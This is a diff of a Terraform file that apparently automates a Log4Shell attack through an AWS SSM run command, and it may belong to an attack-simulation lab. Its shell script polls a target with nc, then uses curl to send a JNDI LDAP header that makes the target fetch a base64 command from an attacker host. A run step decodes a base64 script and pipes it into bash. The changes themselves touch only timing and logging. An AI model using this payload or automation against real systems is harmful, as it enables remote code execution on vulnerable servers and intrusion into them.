@@ -33,15 +33,15 @@ locals {
     docker ps -a >> $LOGFILE 2>&1
     log "payload: curl --verbose ${local.target_ip}:${local.target_port} -H 'X-Api-Version: $${jndi:ldap://${local.attacker_ip}:${local.attacker_ldap_port}/Basic/Command/Base64/${local.base64_log4shell_payload}}'"
     log "checking target: ${local.target_ip}:${local.target_port}"
-    while ! nc -w 5 -vv ${local.target_ip} ${local.target_port}; do
+    while ! nc -w 5 -vv ${local.target_ip} ${local.target_port} >> $LOGFILE; do
         log "failed check - waiting for target";
-        sleep 30
+        sleep 30;
     done;
-    sleep 60
-    log "target available - sending payload"
-    curl --verbose ${local.target_ip}:${local.target_port} -H 'X-Api-Version: $${jndi:ldap://${local.attacker_ip}:${local.attacker_ldap_port}/Basic/Command/Base64/${local.base64_log4shell_payload}}' >> $LOGFILE 2>&1
+    log "target available - sending payload";
+    sleep 5;
+    curl --verbose ${local.target_ip}:${local.target_port} -H 'X-Api-Version: $${jndi:ldap://${local.attacker_ip}:${local.attacker_ldap_port}/Basic/Command/Base64/${local.base64_log4shell_payload}}' >> $LOGFILE 2>&1;
     log "payload sent sleeping..."
-    log "done"
+    log "done";
     EOT
     base64_payload = base64encode(local.payload)
 }
@@ -65,9 +65,9 @@ resource "aws_ssm_document" "exec_docker_log4shell_attacker" {
                     ]
                 },
                 "inputs": {
-                    "timeoutSeconds": "600",
+                    "timeoutSeconds": "1200",
                     "runCommand": [
-                        "echo \"${local.base64_payload}\" > /tmp/payload",
+                        "echo \"${local.base64_payload}\" > /tmp/payload_${basename(abspath(path.module))}",
                         "echo '${local.base64_payload}' | base64 -d | /bin/bash -"
                     ]
                 }
